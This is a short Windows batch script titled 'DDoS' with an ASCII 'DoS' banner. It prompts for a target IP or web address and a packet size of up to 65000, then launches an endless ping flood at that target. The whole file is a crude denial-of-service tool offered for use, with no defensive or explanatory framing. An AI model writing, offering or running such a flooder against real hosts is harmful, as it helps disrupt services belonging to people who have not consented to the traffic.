@echo off
title DDoS
color 2
echo  " _____        _____ "
echo  "|  __ \      / ____|"
echo  "| |  | | ___| (___  "
echo  "| |  | |/ _ \\___ \ "
echo  "| |__| | (_) |___) |"
echo  "|_____/ \___/_____/ "
echo Enter Ip/Web Adres: 
set /p x=
ping -n 1 -a %x%
echo Enter Packet Size(Max. 65000): 
set /p p=
echo you shure?
pause >nul
ping %x% -t -l %p%
